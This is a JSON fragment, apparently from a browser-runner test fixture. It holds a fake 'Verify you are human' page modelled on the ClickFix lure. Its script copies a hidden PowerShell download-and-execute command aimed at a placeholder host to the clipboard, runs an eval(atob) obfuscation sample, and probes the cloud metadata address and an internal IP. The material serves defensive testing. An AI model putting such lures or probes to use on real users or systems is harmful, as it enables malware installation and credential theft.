            "size": 1272,
            "mimeType": "text/html",
            "compression": 0,
            "text": "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>Verify you are human</title></head>\n<body>\n<h2>I'm not a robot</h2>\n<p>Press Win+R, paste with Ctrl+V and press Enter to complete verification.</p>\n<button id=\"verify\">Verify</button>\n<script>\n  // Benign fixture of the ClickFix lure: writes a command to the clipboard.\n  var cmd = 'powershell -w hidden -c \"iwr http://payload.example.invalid/x.ps1 | iex\"';\n  function lure() {\n    if (navigator.clipboard) { navigator.clipboard.writeText(cmd).catch(function () {}); return; }\n    // Fallback used by real kits on plain-http pages, where navigator.clipboard is absent.\n    var t = document.createElement('textarea');\n    t.value = cmd; document.body.appendChild(t); t.select();\n    document.execCommand('copy'); t.remove();\n  }\n  document.getElementById('verify').addEventListener('click', lure);\n  lure();\n  // Obfuscated-looking script (fixture only; decodes to a console message).\n  eval(atob('Y29uc29sZS5sb2coImZpeHR1cmUtb2JmdXNjYXRlZCIp'));\n  // Internal-range probes the runner must block (CAP-9).\n  new Image().src = 'http://169.254.169.254/latest/meta-data/';\n  fetch('http://10.1.2.3/').catch(function () {});\n  setTimeout(function () { location.href = '/download.html'; }, 1500);\n</script>\n</body></html>\n"
